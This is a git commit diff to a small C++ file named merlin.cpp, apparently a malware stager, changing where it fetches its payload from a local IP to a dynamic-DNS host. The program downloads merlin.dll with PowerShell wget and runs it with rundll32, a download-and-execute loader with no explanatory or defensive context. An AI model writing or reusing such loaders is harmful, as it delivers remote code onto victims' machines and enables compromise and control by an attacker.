61049c338a06508f6c2027211bd671bcbd6a10f0
delta12 <delta12@pop-os.localdomain>
2019-02-26 19:53:11 -0500

    Fourth Commit

--- merlin/source/merlin.cpp
+++ merlin/source/merlin.cpp
@@ -4,6 +4,6 @@ using namespace std;
 
 int main()
 {
-     system("powershell wget http://192.168.0.200/merlin.dll -o merlin.dll");
+     system("powershell wget http://d3lta12.ddns.net:8081/merlin.dll -o merlin.dll");
      system("rundll32.exe merlin.dll,Run");
 }
